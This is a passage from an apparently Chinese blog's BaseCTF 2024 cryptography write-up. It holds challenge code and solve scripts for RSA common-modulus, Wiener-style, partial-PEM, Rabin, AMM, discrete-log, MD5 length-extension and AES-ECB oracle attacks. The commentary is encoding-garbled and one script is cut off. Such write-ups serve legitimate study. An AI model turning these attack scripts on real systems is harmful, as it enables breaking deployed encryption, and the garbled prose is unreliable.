6932145147126610816836065944280934160173362059462927112752295077225965836502881335565881607385328990881865436690904056577675885697508058289570333933837515526915707121125766720407153139160751343352211421901876051228566093038929625042619250168565502734932197817082848506826847112949495527533238122893297049985517280574646627011986403578166952789317461581409161873814203023736604394085875778774834314777046086921852377348590998381648241629124408514875110073073851913857329679268519229436092660959841766848676678740851087184214283196544821779336090434587905158006710112461778939184327386306992082433561460542130441825293 \"\"\" æ€è·¯ï¼šå…±æ¨¡æ”»å‡»ï¼Œä½†æ˜¯gcd(e1,e2)=3ï¼Œå†å¼€æ ¹å· exp from gmpy2 import* from Crypto.Util.number import * def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) n = 27855350163093443890983002241607629119744539643165776358993469078731521668677421483556132628708836721737685936980427467856642738196111748018522018598646125626995613169001111504706363742194664774823604738939411512861441742683157275818500991834651769368178320088982759626122029956515159435424882855075032400667120376075618896752694718491438251810609878021717559466498493103257912108879328270813061231904227056671621363669388496383136964549879459562004569059185078204867346250733489663015417879915436157806942021693920206071715538430633494012923651469196048546309592946901609803631751035364478773126967010589504275776307 e1 = 3747 e2 = 2991 c1 = 24426579024062518665031958216110619832653602343205488454298659533869220501923184793828421371206493659949730138867555889074137026401207985428160803910695088081370233571905915349589146504374710444468715701305061060934519410886010929009297226496448218819742287990364436349188987723637449590579092391100714056589967894609950537021838172987840638735592599678186555961654312442380755963257875487240962193060914793587712733601168204859917001269928487633954556221987632934190217367502677285906521385169669644977192556145782303526375491484736352799180747403161343130663661867413380222714012960607473395828938694285120527085083 c2 = 6932145147126610816836065944280934160173362059462927112752295077225965836502881335565881607385328990881865436690904056577675885697508058289570333933837515526915707121125766720407153139160751343352211421901876051228566093038929625042619250168565502734932197817082848506826847112949495527533238122893297049985517280574646627011986403578166952789317461581409161873814203023736604394085875778774","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:3:3","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"ez_log task from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b, getPrime from Crypto.Cipher import AES from random import randint flag = b\"flag{test_flag}\" pad = lambda x: x+b'\\x00'*(16-len(x)%16) def encrypt(KEY): cipher= AES.new(KEY,AES.MODE_ECB) encrypted =cipher.encrypt(flag) return encrypted def decrypt(KEY): cipher= AES.new(KEY,AES.MODE_ECB) decrypted =cipher.decrypt(enc) return decrypted flag = pad(flag) x = randint(10 ** 7, 10 ** 8) y = randint(10 ** 7, 10 ** 8) n = getPrime(28) z = pow(y, x, n) enc = encrypt(pad(l2b(x))) print(f'enc = {b2l(enc)}') print(f'y = {y}') print(f'n = {n}') print(f'z = {z}') ''' enc = 33416570913716503492297352041317858420349510954381249751537743898024527101872454706181188441210166165803904185550746 y = 82941012 n = 228338567 z = 51306718 ''' æ€è·¯ï¼šå°±æ˜¯ç¦»æ•£å¯¹æ•°ï¼Œç»ƒä¸€ä¸‹è„šæœ¬å§(æ‰€ä»¥æ²¡ç”¨sagemath) exp from Crypto.Util.number import long_to_bytes as l2b from Crypto.Cipher import AES from math import isqrt from sympy import mod_inverse # å·²çŸ¥å€¼ y = 82941012 n = 228338567 z = 51306718 def baby_step_giant_step(y, z, n): # m ä¸º sqrt(n) çš„ä¸Šç•Œ m = isqrt(n) + 1 # è®¡ç®— Baby steps: (y^j) % n for j in range(m) baby_steps = {} current = 1 for j in range(m): baby_steps[current] = j current = (current * y) % n # è®¡ç®— Giant steps: (z * y^(-m))^i % n y_m_inv = mod_inverse(pow(y, m, n), n) # y^-m (mod n) giant_step = z for i in range(m): if giant_step in baby_steps: return i * m + baby_steps[giant_step] giant_step = (giant_step * y_m_inv) % n return None # æœªæ‰¾åˆ° x = baby_step_giant_step(y, z, n) if x is not None: print(f'Found x: {x}') else: print('No solution found') if x is not None: KEY = l2b(x) + b'\\x00' * (16 - len(l2b(x)) % 16) enc = 33416570913716503492297352041317858420349510954381249751537743898024527101872454706181188441210166165803904185550746 cipher = AES.new(KEY, AES.MODE_ECB) decrypted_flag = cipher.decrypt(l2b(enc)) print(f'Decrypted flag: {decrypted_flag}') ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:3:4","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"wiener task from Crypto.Util.number import * import decimal flag=b\"BaseCTF{}\" m = bytes_to_long(flag) p = getPrime(1024) q = getPrime(1024) n=p*q e=65537 c=pow(m,e,n) print(\"e =\",e) print(\"c =\",c) decimal.getcontext().prec = 648 P=decimal.Decimal(p) Q=decimal.Decimal(q) leak=decimal.Decimal((3*P*Q-1)/(3*Q*Q)) print(\"leak =\",leak) \"\"\" e = 65537 c = 11032748573623426359632659657114807044712138586316710250985606809252700461490504487308849626514319062562557448839550994242999334882617031487618174168038491566640081840111747765753878087564318833273878755416584962921669911444225959335274753391800995531023212276838665202257007640354237043291129197348884914956663597240094662207929658519596987351984403258345205873566463643624175318315064440456858013874962784792564480286904620663695194689839431808082976248378509181327101557380978849545906691903896662095520288964101796965095129861467059775556110616007889846240936219381379219605528051627402300580239311202137582442057 leak = 0.829374344780877053838760251345359097311540811993463349625630085472892814959843248358036249898871908548743719153319438638517170060651237635838827482534816419091949205584951292517303330452910012749674475329235689229498752425379611083979518257734473992186831474208400813283887045691145481237726578827559198828469462343342343287720369159899636816373592067698883361360269728719786071024354151682314608072902347335691012713629816579496252896260869382806838857194293618332286500427694077400072428506897829689703872985954772105672992293334668485358785863779749153981721900135318166811250762946069962348114491411585418993494561587403918162681937152503739843 \"\"\" æ€è·¯ï¼šç›´æ¥pqè¿åˆ†æ•°ï¼Œå»çˆ†ç ´æˆ–è€…æ˜¯æœç´¢éƒ½è¡Œ exp from gmpy2 import * from Crypto.Util.number import * e = 65537 c = 11032748573623426359632659657114807044712138586316710250985606809252700461490504487308849626514319062562557448839550994242999334882617031487618174168038491566640081840111747765753878087564318833273878755416584962921669911444225959335274753391800995531023212276838665202257007640354237043291129197348884914956663597240094662207929658519596987351984403258345205873566463643624175318315064440456858013874962784792564480286904620663695194689839431808082976248378509181327101557380978849545906691903896662095520288964101796965095129861467059775556110616007889846240936219381379219605528051627402300580239311202137582442057 leak = 0.829374344780877053838760251345359097311540811993463349625630085472892814959843248358036249898871908548743719153319438638517170060651237635838827482534816419091949205584951292517303330452910012749674475329235689229498752425379611083979518257734473992186831474208400813283887045691145481237726578827559198828469462343342343287720369159899636816373592067698883361360269728719786071024354151682314608072902347335691012713629816579496252896260869382806838857194293618332286500427694077400072428506897829689703872985954772105672992293334668485358785863779749153981721900135318166811250762946069962348114491411585418993494561587403918162681937152503739843 con=continued_fraction(leak) for i in range(0, len(con)): q = con.denominator(i) p = con.numerator(i) if is_prime(q) and is_prime(p): print(long_to_bytes(power_mod(c, inverse(e, q-1),q))) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:3:5","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"week3ã®é¢˜ç›® ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:4:0","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"å“å‘€æ•°æ®ä¸¢å¤±äº† task -----BEGIN RSA PRIVATE KEY----- MIICXAIBAAKBgQC9J4SEEirvmmnsZHKQIZ3tBu3St2EXIbMmhQsvUGDa7tdpQ1Zm fEecqcy2lp9Pvm3H+mdZrKIdipaogajkoCF3MnV+ZJ1QMZFRH6ltpC7R2i+jvIyc ZfvZwN1vQwNZrEXkVdMsWw6inSHmR/+A5Qq8u4D3attnAHoE6F2660yPHQIDAQAB AoGAImXjVVkwca41AQYrR0a1v3r5GM68W0aHm8OqCwqk8mtoxP234p9LLpQ6ZCH0 Cr5onGtPDCG2wYSIbVBW9GyiaQhUDsB7gq1H5meXGgH6xhYuk6f8Ya7VZg+Cauuj TXiszRj8WeeSFwHxD/UdUog3BrhkKHz9s04wnJOCnSnYZ8kCQQDG4J********** **************************************************************** **************************************************************** **************************************************************** **************************************************************** **************************************************************** **************************************************************** **************************************************************** -----END RSA PRIVATE KEY----- c=5350934245443624615705634168321364454795591666560826831012326948814964674913623395481194876787286689366750529186073548501661956439774413391667376304378756290912469006122113210585561764352070241110069022406544206322583369771609766119501319329839086445136604208397605143623014788767486449680728261586601862940 æ€è·¯ï¼šç»å…¸çš„éƒ¨åˆ†pemä¸¢å¤±ï¼Œæ•´ä½“è½¬16è¿›åˆ¶åæŒ‰ç…§02åˆ†å‰² exp 30 82 025c 0201 00 n 028181 0x00bd278484122aef9a69ec647290219ded06edd2b7611721b326850b2f5060daeed7694356667c479ca9ccb6969f4fbe6dc7fa6759aca21d8a96a881a8e4a0217732757e649d503191511fa96da42ed1da2fa3bc8c9c65fbd9c0dd6f430359ac45e455d32c5b0ea29d21e647ff80e50abcbb80f76adb67007a04e85dbaeb4c8f1d e 0203 0x010001 d 028180 0x2265e355593071ae3501062b4746b5bf7af918cebc5b46879bc3aa0b0aa4f26b68c4fdb7e29f4b2e943a6421f40abe689c6b4f0c21b6c184886d5056f46ca26908540ec07b82ad47e667971a01fac6162e93a7fc61aed5660f826aeba34d78accd18fc59e7921701f10ff51d52883706b864287cfdb34e309c93829d29d867c9 024100c6e0 e=0x10001 d=0x2265e355593071ae3501062b4746b5bf7af918cebc5b46879bc3aa0b0aa4f26b68c4fdb7e29f4b2e943a6421f40abe689c6b4f0c21b6c184886d5056f46ca26908540ec07b82ad47e667971a01fac6162e93a7fc61aed5660f826aeba34d78accd18fc59e7921701f10ff51d52883706b864287cfdb34e309c93829d29d867c9 n=0xbd278484122aef9a69ec647290219ded06edd2b7611721b326850b2f5060daeed7694356667c479ca9ccb6969f4fbe6dc7fa6759aca21d8a96a881a8e4a0217732757e649d503191511fa96da42ed1da2fa3bc8c9c65fbd9c0dd6f430359ac45e455d32c5b0ea29d21e647ff80e50abcbb80f76adb67007a04e85dbaeb4c8f1d c=5350934245443624615705634168321364454795591666560826831012326948814964674913623395481194876787286689366750529186073548501661956439774413391667376304378756290912469006122113210585561764352070241110069022406544206322583369771609766119501319329839086445136604208397605143623014788767486449680728261586601862940 from Crypto.Util.number import * m=pow(c,d,n) print(long_to_bytes(m)) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:4:1","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"rabin task from Crypto.Util.number import * flag=b\"BaseCTF{}\" m = bytes_to_long(flag) p = getPrime(512) q = getPrime(512) assert p%4==3 and q%4==3 n = p*q e = 4 c = pow(m,e,n) print(\"p=\",p) print(\"q=\",q) print(\"n=\",n) print(\"c=\",c) print(\"e=\",e) \"\"\" p= 8531212975719216550108614256955774722172741885676113601617182716356239301381951899737237219659253655889636684200345109462928796329670321336864298557778843 q= 7443256287912111739335729314443559886458007838130371799255078565502662459436043455787869631999073617967343884377537828940738213460508765519478956421282871 n= 63500004625039456439237191267891267558404574431112995926594213383621331385226487443753506088788203040258384788149958095020759745138424276657604371402824844725005596890673468964961037168078105356669148960568974603581485045691990626520286184874115519591663033533771400334558853058140717812903874350138362098253 c= 51452608438757130697131508192775727191605112918772187364577097224326062184288501602000700342623122861398852536963355962672293705131887315354242193416090384360837672258861475017098419459125395949090523474744886423754439919504732741712693909507972791203801494594878447921609420574365853676576693694677914169353 e= 4 \"\"\" æ€è·¯ï¼šç»å…¸rabinæ¿å­ï¼Œä¸ä¼šçš„å»æœåŸç† exp from Crypto.Util.number import * from gmpy2 import iroot, invert p= 8531212975719216550108614256955774722172741885676113601617182716356239301381951899737237219659253655889636684200345109462928796329670321336864298557778843 q= 7443256287912111739335729314443559886458007838130371799255078565502662459436043455787869631999073617967343884377537828940738213460508765519478956421282871 n= 63500004625039456439237191267891267558404574431112995926594213383621331385226487443753506088788203040258384788149958095020759745138424276657604371402824844725005596890673468964961037168078105356669148960568974603581485045691990626520286184874115519591663033533771400334558853058140717812903874350138362098253 c= 51452608438757130697131508192775727191605112918772187364577097224326062184288501602000700342623122861398852536963355962672293705131887315354242193416090384360837672258861475017098419459125395949090523474744886423754439919504732741712693909507972791203801494594878447921609420574365853676576693694677914169353 e= 4 inv_p = invert(p, q) inv_q = invert(q, p) mp = pow(c, (p + 1) // 4, p) mq = pow(c, (q + 1) // 4, q) a = (inv_p * p * mq + inv_q * q * mp) % n b = n - int(a) c = (inv_p * p * mq - inv_q * q * mp) % n d = n - int(c) # å› ä¸ºrabin åŠ å¯†æœ‰å››ç§ç»“æœï¼Œå…¨éƒ¨åˆ—å‡ºã€‚ aa = [a, b, c, d] for i in aa: # print(i) print(long_to_bytes(int(iroot(i,2)[0]))) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:4:2","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"extendmd5 task from Crypto.Util.number import * import hashlib import socketserver import signal import os import random flag = os.getenv('GZCTF_FLAG') class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b'' while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u003c BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b'\\n' self.request.sendall(msg) except: pass def recv(self): return self._recvall() def my_md5(self,text): mymd5=hashlib.md5() mymd5.update(text) return mymd5.hexdigest() def handle(self): signal.alarm(30) c=random.randint(1,64) want=random.randbytes(c) want_md5=self.my_md5(want) self.send(want_md5.encode()) while True: self.send(b\"\\nPlease input the secret:\") secret = self.recv() final=want+secret final_md5=self.my_md5(final) self.send(b\"\\nPlease input your md5:\") your_md5=self.recv().decode() if final_md5 == your_md5: self.send(flag.encode()) break self.send(b\"\\nConnection has been closed =.= \") self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \"__main__\": HOST, PORT = '0.0.0.0', 9999 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() æ€è·¯ï¼šå¯†ç é‡Œé¢çš„md5æ‹“å±•ï¼Œä¸æ˜¯webçš„ï¼ä½†æ˜¯è¦è§£ä¸€ç™¾æ¬¡ã€‚ æ­¤å¤„ç”¨nabyå¸ˆå‚…çš„expï¼šåŸç†ï¼š é¦–å…ˆéœ€è¦ä»md5åŠ å¯†è¿‡ç¨‹å¼€å§‹è¯´èµ·ï¼Œmd5åŠ å¯†æ˜¯åˆ†ç»„è¿›è¡ŒåŠ å¯†çš„ï¼Œæ¯ç»„512bitsã€‚åœ¨ä¸€å¼€å§‹ï¼Œéœ€è¦å¯¹æ˜æ–‡è¿›è¡Œå¡«å……ï¼Œå¦‚æœæœ€ååˆ†ç»„ä¸æ»¡512bitsçš„éœ€è¦å¡«å……åˆ°512bitsï¼›å¦‚æœåŸå§‹å†…å®¹åˆšåˆšå¥½å¯ä»¥åˆ†ç»„ï¼Œé‚£ä¹Ÿéœ€è¦å¡«å……ä¸€ä¸ª512bitsçš„åˆ†ç»„ã€‚md5æ‰©å±•æ”»å‡»æœ€é‡è¦çš„å°±æ˜¯ç†è§£å¡«å……è§„åˆ™ã€‚ å¡«å……è§„åˆ™ï¼š é¦–å…ˆæ·»åŠ ä¸€ä¸ªå›ºå®šå­—èŠ‚bâ€™\\x80â€™ï¼Œä¹‹åéœ€è¦å¡«å……ç”±åŸå§‹æ˜æ–‡é•¿åº¦è®¡ç®—å¾—æ¥çš„8ä¸ªå­—èŠ‚ï¼Œè¿™8ä¸ªå­—èŠ‚æ˜¯ä¸€å®šéœ€è¦å¡«å……çš„ï¼Œæ‰€ä»¥å¦‚æœè¿™ä¸ªæ—¶å€™æ˜æ–‡å·²ç»åˆ°è¾¾äº†57bytesï¼Œå†å¡«å……8å­—èŠ‚å°±ä¼šä¸å†æ˜¯åˆšå¥½çš„64bytes(512bits)ï¼Œæ‰€ä»¥è¿™æ—¶å€™æˆ‘ä»¬è¦æ–°æ·»ä¸€ä¸ªåˆ†ç»„ã€‚æœ€åå…«å­—èŠ‚ä¸ºåŸå§‹æ˜æ–‡é•¿åº¦ï¼Œå¡«å……æ–¹å¼ä¸ºå°ç«¯åºã€‚ æ¯”å¦‚len=10ï¼Œå…ˆå¡«ä¸Šä¸ªbâ€™\\x80â€™ï¼Œè¿™æ—¶å€™é•¿åº¦ä¸º11ï¼Œå¯ä»¥å¡«å……8å­—èŠ‚ï¼Œé‚£ä¹ˆå†å¡«å……bâ€™\\x00â€™*(64-8-1-10)ï¼Œ64ä¸ºä¸€ä¸ªåˆ†ç»„çš„å­—èŠ‚æ•°ï¼Œ8ä¸ºæœ€åéœ€è¦å¡«å……çš„æ•°æ®ï¼Œ1æ˜¯æœ€å¼€å§‹å¡«å……çš„bâ€™\\x80â€™ï¼Œæœ€åå¡«å……å…«ä¸ªå­—èŠ‚ä¸ºbâ€™\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00â€™ã€‚ æ¯”å¦‚len=33ï¼Œå…ˆå¡«ä¸Šä¸ªbâ€™\\x80â€™ï¼Œé‚£ä¹ˆå†å¡«å……bâ€™\\x00â€™*(64-8-1-33)ï¼Œæœ€åå¡«å……å…«ä¸ªå­—èŠ‚ä¸ºbâ€™\\x08\\x01\\x00\\x00\\x00\\x00\\x00\\x00â€™ã€‚åŸå§‹æ•°æ®ä¸º264bitsï¼ŒéªŒè¯ï¼š0x108=264 æ¯”å¦‚len=56ï¼Œå…ˆå¡«ä¸Šä¸ªbâ€™\\x80â€™ï¼Œè¿™æ—¶å€™æœ‰57å­—èŠ‚ï¼Œå†å¡«å……8å­—èŠ‚çš„è¯ä¸º65å­—èŠ‚ï¼Œé‚£ä¹ˆä¸æ»¡è¶³åˆ†ç»„æ¡ä»¶ï¼Œæ‰€ä»¥è¿™æ—¶å€™æˆ‘ä»¬éœ€è¦å†å¡«å……bâ€™\\x00â€™(642-8-1-56)ï¼Œä¹Ÿå°±æ˜¯63ä¸ª0å­—èŠ‚ï¼Œæœ€åå¡«å……å…«ä¸ªå­—èŠ‚ä¸ºbâ€™\\xc0\\x01\\x00\\x00\\x00\\x00\\x00\\x00ã€‚åŸå§‹æ•°æ®ä¸º448bitsï¼ŒéªŒè¯ï¼š0x01c0=448 å½“æˆ‘ä»¬å¡«å……å®Œæ•°æ®åï¼Œä»ç¬¬ä¸€ä¸ªåˆ†ç»„å¼€å§‹è¿›è¡Œmd5åŠ å¯†ï¼ŒåŠ å¯†è¿‡ç¨‹å¯ä»¥ä¸ç”¨åœ¨æ„ï¼Œåªéœ€çŸ¥é“æ¯æ¬¡åŠ å¯†åå¾—åˆ°32ä¸ª16å…­è¿›åˆ¶ï¼ŒåŠ å¯†åçš„ç»“æœåˆ†æˆå››ç»„ï¼Œå½“æˆä¸‹ä¸€ä¸ªåˆ†ç»„åŠ å¯†çš„IVï¼Œè¿™æ˜¯æ”»å‡»çš„å…³é”®ã€‚ ä¸€å¼€å§‹ï¼Œæˆ‘ä»¬çŸ¥é“åŸå§‹å†…å®¹çš„md5å€¼ï¼Œå¹¶ä¸”åŸå§‹å†…å®¹é•¿åº¦å°äº64å­—èŠ‚ã€‚è¿™æ—¶å€™ï¼ŒæœåŠ¡å™¨æˆ‘ä»¬å¯ä»¥åœ¨åŸå§‹å†…å®¹åé¢æ·»åŠ è‡ªå®šä¹‰æ•°æ®ï¼Œé‚£ä¹ˆæœ€é‡è¦çš„å°±æ˜¯ï¼Œæ ¹æ®å¡«å……è§„åˆ™ï¼Œæˆ‘ä»¬åªè¦çŸ¥é“åŸå§‹å†…å®¹é•¿åº¦ï¼Œæˆ‘ä»¬å°±å¯ä»¥è‡ªå·±è¿›è¡Œå¡«å……ï¼Œåªè¦æˆ‘ä»¬è‡ªå·±å¡«å……çš„æ•°æ®ä¸md5åŠ å¯†æ—¶ä¸€æ ·ï¼Œæœ€åè®¡ç®—å‡ºçš„md5å€¼ä¹Ÿä¼šä¸€æ ·ï¼Œé‚£ä¹ˆè¿™ä¸ªç»“æœæ˜¯ä½œä¸ºä¸‹ä¸€ç»„å†…å®¹åŠ å¯†æ—¶çš„IVã€‚ æ‰€ä»¥æˆ‘ä»¬åƒæœåŠ¡å™¨å‘é€æ•°æ®ä¸ºï¼šå¡«å……å†…å®¹+ä»»æ„å†…å®¹ æœ€åå‘é€ ä»»æ„å†…å®¹çš„md5ç»“æœï¼Œå½“ç„¶è¿™é‡Œéœ€è¦æ ¹æ®æœåŠ¡å™¨ä¸€å¼€å§‹ä¼ æ¥çš„md5å€¼ä½œä¸ºIVæ¥è¿›è¡ŒåŠ å¯† è¿™é‡Œæˆ‘ç”¨GPTç”Ÿæˆäº†ä¸€ä»½md5åŠ å¯†ä»£ç ï¼Œåœ¨åŠ å¯†æ—¶ä¼ é€è¿›å»IVå€¼ï¼Œæœ€é‡è¦çš„æ˜¯ï¼Œæˆ‘è¿™ä»½æºç æ˜¯åŸå§‹çš„md5åŠ å¯†ä»£ç ï¼Œæˆ‘ä»¬éœ€è¦åœ¨â€ä»»æ„å†…å®¹â€œå‰å¡«ä¸Š64bytes*åˆ†ç»„æ•°ï¼Œè€Œä¸”åœ¨åŠ å¯†å‡½æ•°(my_md5)ä¸­ï¼Œæˆ‘ä»¬åªè¦æœ€åä¸€ä¸ªåˆ†ç»„çš„ç»“æœï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è·³è¿‡å‰é¢å‡ ä¸ªåˆ†ç»„ï¼ˆåœ¨ä»£ç ä¸­skipå˜é‡å¤„ä½“ç°ï¼‰ exp from pwn import * import struct import math # å®šä¹‰MD5æ‰€éœ€çš„å¸¸é‡ T = [int(4294967296 * abs(math.sin(i + 1))) \u0026 0xFFFFFFFF for i in range(64)] # å®šä¹‰å·¦æ—‹è½¬å‡½æ•° def left_rotate(x, c): return (x \u003c\u003c c) | (x \u003e\u003e (32 - c)) # å®šä¹‰MD5ä¸»å¾ªç¯æ‰€éœ€çš„å››ä¸ªåŸºæœ¬å‡½æ•° def F(x, y, z): return (x \u0026 y) | (~x \u0026 z) def G(x, y, z): return (x \u0026 z) | (y \u0026 ~z) def H(x, y, z): return x ^ y ^ z def I(x, y, z): return y ^ (x | ~z) # å®šä¹‰MD5ç®—æ³• def my_md5(message, A, B, C, D, skip): # åˆå§‹åŒ–å˜é‡ a, b, c, d = A, B, C, D # å¡«å……æ¶ˆæ¯ original_length = len(message) * 8 message += b'\\x80' while (len(message) * 8) % 512 != 448: message += b'\\x00' message += struct.pack('\u003cQ', original_length) # å¤„ç†æ¯ä¸ª512ä½ï¼ˆ64å­—èŠ‚ï¼‰å— # è·³è¿‡å‰å‡ ä¸ªåˆ†ç»„ for i in range(64 * skip, len(message), 64): block = message[i:i + 64] X = struct.unpack('\u003c16I', block) # å¤‡ä»½å½“å‰çš„a, b, c, då€¼ AA, BB, CC, DD = a, b, c, d # è¿›è¡Œå››è½®æ“ä½œï¼Œæ¯è½®16æ­¥ for i in range(64): if 0 \u003c= i \u003c= 15: k, s, func = i, [7, 12, 17, 22][i % 4], F(b, c, d) elif 16 \u003c= i \u003c= 31: k, s, func = (5 * i + 1) % 16, [5, 9, 14, 20][i % 4], G(b, c, d) elif 32 \u003c= i \u003c= 47: k, s, func = (3 * i + 5) % 16, [4, 11, 16, 23][i % 4], H(b, c, d) elif 48 \u003c= i \u003c= 63: k, s, func = (7 * i) % 16, [6, 10, 15, 21][i % 4], I(b, c, d) temp = b + left_rotate((a + func + X[k] + T[i]) \u0026 0xFFFFFFFF, s) a, b, c, d = d, temp \u0026 0xFFFFFFFF, b, c # å°†ç»“æœåŠ åˆ°å½“å‰çš„a, b, c, d a = (a + AA) \u0026 0xFFFFFFFF b = (b + BB) \u0026 0xFFFFFFFF c = (c + CC) \u0026 0xFFFFFFFF d = (d + DD) \u0026 0xFFFFFFFF # è¿”å›å“ˆå¸Œç»“æœ return struct.","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:4:3","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"Fin ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:5:0","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"ã®æ­ªæ¥ task from Crypto.Util.number import * from gmpy2 import * flag=b'' assert len(flag)==28 m=bytes_to_long(flag) n=getPrime(2048) e=32 c=pow(m,e,n) print(\"n =\",n) print(\"e =\",e) print(\"c =\",c) æ€è·¯ï¼šAMM exp n = 17363249226879909675667629533972233798566313669420563155296918020175446973456428454735263489044575257132690882883587342817653451483222705760704890265900885255972067349104579938808591608382992680533327518070878297438339884996059309549300942570104747348751766711833983705979880714174709047335147739991850385244159235504375559144283494800573079055547597410783559965162216203307100248001158445665271438067670522510991047688414176659907164436539491205637933681658814267567385232097679554282863595183422504494357205180093828786415060565003183966959273253039416986816444073158723191290806413175478175738266995214965220231649 e = 32 c = 6840453756562205147103219479843999687625029691496635689045074720240615321966887831642035124198445485320265097191334720798522097422084141332044111764558336174743819347952914775206809737198058220362381349481027893609144697054465070779290329222696236671374412706789862193871687821041053566873553189148668599841084370137084893575567622972476409755187388121177923217208552049876944055745912987536390075417261016809335539362984984190264791744790640858201038207982043569204062714722892105134794280417020318408200038144689432974312283915592134911446185412636709207566063730723406969727969141426530341540330398465744403597273 from Crypto.Util.number import * import gmpy2 import time import random def AMM(o, r, q): start = time.time() print('\\n----------------------------------------------------------------------------------') print('Start to run Adleman-Manders-Miller Root Extraction Method') print('Try to find one {:#x}th root of {} modulo {}'.format(r, o, q)) g = GF(q) o = g(o) p = g(random.randint(1, q)) while p ^ ((q-1) // r) == 1: p = g(random.randint(1, q)) print('[+] Find p:{}'.format(p)) t = 0 s = q - 1 while s % r == 0: t += 1 s = s // r print('[+] Find s:{}, t:{}'.format(s, t)) k = 1 while (k * s + 1) % r != 0: k += 1 alp = (k * s + 1) // r print('[+] Find alp:{}'.format(alp)) a = p ^ (r**(t-1) * s) b = o ^ (r*alp - 1) c = p ^ s h = 1 for i in range(1, t): d = b ^ (r^(t-1-i)) if d == 1: j = 0 else: print('[+] Calculating DLP...') j = - discrete_log(a, d) print('[+] Finish DLP...') b = b * (c^r)^j h = h * c^j c = c ^ r result = o^alp * h end = time.time() print(\"Finished in {} seconds.\".format(end - start)) print('Find one solution: {}'.format(result)) return result def findAllPRoot(p, e): print(\"Start to find all the Primitive {:#x}th root of 1 modulo {}.\".format(e, p)) start = time.time() proot = set() while len(proot) \u003c e: proot.add(pow(random.randint(2, p-1), (p-1)//e, p)) end = time.time() print(\"Finished in {} seconds.\".format(end - start)) return proot def findAllSolutions(mp, proot, cp, p): print(\"Start to find all the {:#x}th root of {} modulo {}.\".format(e, cp, p)) start = time.time() all_mp = set() for root in proot: mp2 = mp * root % p assert(pow(mp2, e, p) == cp) all_mp.add(mp2) end = time.time() print(\"Finished in {} seconds.\".format(end - start)) return all_mp mp = AMM(c,e,n) p_proot = findAllPRoot(n, e) mps = findAllSolutions(mp, p_proot, c, n) for i in mps: flag = long_to_bytes(int(i)) if b'BaseCTF{' in flag: print(flag) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:5:1","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"ECBæ˜¯ä¸å®‰å…¨çš„ task from Crypto.Util.number import * from Crypto.Util.Padding import * from Crypto.Cipher import AES import socketserver import os import base64 flag = os.getenv('GZCTF_FLAG').encode() class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b'' while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u003c BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b'\\n' self.request.sendall(msg) except: pass def recv(self): return self._recvall() def handle(self): self.send(b\"the server will connect you entered to the front of flag.\") self.send(b\"then you will receive ciphertext(b64encode) encrypted by AES-ECB.\") key=os.urandom(16) my_aes=AES.new(key=key,mode=AES.MODE_ECB) self.send(base64.b64encode(my_aes.encrypt(pad(flag,AES.block_size)))) while True: self.send(b':') cin=self.recv() final=cin+flag self.send(base64.b64encode(my_aes.encrypt(pad(final,AES.block_size)))) self.send(b\"\\nConnection has been closed =.= \") self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \"__main__\": HOST, PORT = '0.0.0.0', 9999 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() æ€è·¯ï¼šECBæ¨¡å¼ä¸­ï¼Œç®—æ³•å¯¹æ¯ä¸€ä¸ªåˆ†ç»„è¿›è¡ŒåŠ å¯†ï¼Œä¸å‰ååˆ†ç»„æ— å…³ï¼Œå½“å¯†é’¥å›ºå®šä¹‹åï¼Œåªè¦è¿™ä¸€ä¸ªåˆ†ç»„çš„æ˜æ–‡ç›¸åŒï¼Œé‚£ä¹ˆåŠ å¯†ä¹‹åçš„å¯†æ–‡ä¹Ÿç›¸åŒã€‚ 